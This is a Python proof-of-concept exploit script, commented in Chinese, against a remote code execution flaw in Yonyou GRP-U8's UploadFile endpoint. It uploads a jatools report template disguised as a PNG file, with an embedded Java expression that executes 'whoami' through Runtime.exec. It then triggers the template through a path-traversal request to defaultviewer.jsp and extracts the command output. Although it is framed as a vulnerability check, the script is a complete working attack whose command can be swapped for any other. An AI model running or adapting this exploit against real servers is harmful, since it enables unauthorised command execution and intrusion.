import requests
import re
import sys

def verify(url):
    """
    检测用友GRP-U8 UploadFile RCE漏洞
    参数:
        url (str): 目标网站地址
    返回:
        bool: 是否存在漏洞
    """
    try:
        # 规范化URL
        if not url.startswith('http'):
            url = 'http://' + url
        if url.endswith('/'):
            url = url.rstrip('/')

        # 第一步：上传恶意文件
        upload_url = f"{url}/UploadFile"
        boundary = "----WebKitFormBoundaryicNNJvjQHmXpnjFc"
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "close"
        }

        # 构造恶意payload
        payload = """
        <jatools Class="jatools.ReportDocument" Name="jatools report template">
<VariableContext>
</VariableContext>
<Page>
<Name>panel</Name>
<Children ItemClass="PagePanel">
<Item0>
<Name>header</Name>
<Width>753</Width>
<Height>80</Height>
<Children ItemClass="Label">
<Item0>
<ForeColor>-65536</ForeColor>
<X>41</X>
<Y>15</Y>
<Width>362</Width>
<Height>62</Height>
</Item0>
</Children>
<Type>100</Type>
</Item0>
<Item1>
<Name>footer</Name>
<Y>802</Y>
<Width>753</Width>
<Height>280</Height>
<Type>103</Type>
</Item1>
<Item2>
<Name>body</Name>
<Y>80</Y>
<Width>753</Width>
<Height>722</Height>
<Children ItemClass="Table">
<Item0>
<NodePath>学生表</NodePath>
<X>115</X>
<Y>77</Y>
<Children>
<Item0 Class="Label">
<Text>家庭成员</Text>
<Border/>
<PrintStyle>united-level:1;</PrintStyle>
<Cell>
<Row>3</Row>
<Col>0</Col>
<RowSpan>2</RowSpan>
</Cell>
</Item0>
<Item1 Class="Label">
<Text>关系</Text>
<BackColor>-4144897</BackColor>
<Border/>
<Cell>
<Row>3</Row>
<Col>1</Col>
</Cell>
</Item1>
<Item2 Class="Label">
<Text>性别</Text>
<BackColor>-4144897</BackColor>
<Border/>
<Cell>
<Row>3</Row>
<Col>2</Col>
</Cell>
</Item2>
<Item3 Class="Label">
<Text>年龄</Text>
<BackColor>-4144897</BackColor>
<Border/>
<Cell>
<Row>3</Row>
<Col>3</Col>
</Cell>
</Item3>
<Item4 Class="Label">
<Text>得分</Text>
<Border/>
<Cell>
<Row>2</Row>
<Col>0</Col>
</Cell>
</Item4>
<Item5 Class="Label">
<Text>性别</Text>
<Border/>
<Cell>
<Row>1</Row>
<Col>0</Col>
</Cell>
</Item5>
<Item6 Class="Label">
<Text>姓名</Text>
<Border/>
<Cell>
<Row>0</Row>
<Col>0</Col>
</Cell>
</Item6>
<Item7 Class="Text">
<Variable>=$学生表</Variable>
<Border/>
<Cell>
<Row>0</Row>
<Col>1</Col>
<ColSpan>3</ColSpan>
</Cell>
</Item7>
<Item8 Class="Text">
<Variable>=$学生表.value()</Variable>
<Border/>
<Cell>
<Row>1</Row>
<Col>1</Col>
<ColSpan>3</ColSpan>
</Cell>
</Item8>
<Item9 Class="Text">
<Variable>=$学生表.getName()</Variable>
<Border/>
<Cell>
<Row>2</Row>
<Col>1</Col>
<ColSpan>3</ColSpan>
</Cell>
</Item9>
<Item10 Class="RowPanel">
<Cell>
<Row>4</Row>
<Col>0</Col>
<ColSpan>4</ColSpan>
</Cell>
<Children ItemClass="Text">
<Item0>
<Variable></Variable>
<Border/>
<Cell>
<Row>4</Row>
<Col>3</Col>
</Cell>
</Item0>
<Item1>
<Variable></Variable>
<Border/>
<Cell>
<Row>4</Row>
<Col>2</Col>
</Cell>
</Item1>
<Item2>
<Variable>;</Variable>
<Border/>
<Cell>
<Row>4</Row>
<Col>1</Col>
</Cell>
</Item2>
</Children>
<NodePath>成员</NodePath>
</Item10>
</Children>
<ColumnWidths>60,60,60,60</ColumnWidths>
<RowHeights>20,20,20,20,20</RowHeights>
</Item0>
</Children>
<Type>102</Type>
</Item2>
</Children>
</Page>
<NodeSource>
<Children ItemClass="ArrayNodeSource">
<Item0>
<Children ItemClass="ArrayNodeSource">
<Item0>
<TagName>成员</TagName>
<Expression>$.value()</Expression>
</Item0>
</Children>
<TagName>学生表</TagName>
<Expression>new Object[]{new BufferedReader(new InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())).readLine()}</Expression>
</Item0>
</Children>
</NodeSource>
</jatools>"""

        # 构造multipart表单数据
        body = (
            f"------{boundary}\r\n"
            'Content-Disposition: form-data; name="input_localfile"; filename="gg.png"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
            f"{payload}\r\n"
            f"------{boundary}\r\n"
            'Content-Disposition: form-data; name="type"\r\n\r\n'
            "1\r\n"
            f"------{boundary}--\r\n"
        ).encode('utf-8')  # 显式编码为UTF-8

        # 发送上传请求
        requests.post(upload_url, headers=headers, data=body, timeout=10)

        # 第二步：检查执行结果
        check_url = f"{url}/u8qx/tools/defaultviewer.jsp?file=../../upload/gg.png"
        check_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
        }
        
        response = requests.get(check_url, headers=check_headers, timeout=10)
        
        # 检查响应状态码和关键词
        if response.status_code == 200:
            content = response.text.lower()
            keywords = ['nt', 'system', 'administrator', '\\', 'root', 'www']
            if any(keyword in content for keyword in keywords):
                return re.findall("<p class='c2' >([^<]+)</p>", content, re.I)[0]
                
        return False

    except Exception as e:
        print(f"Error: {str(e)}")
        return False

if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，执行 whoami 的结果为：", data)
    else:
        print("[-]漏洞不存在")
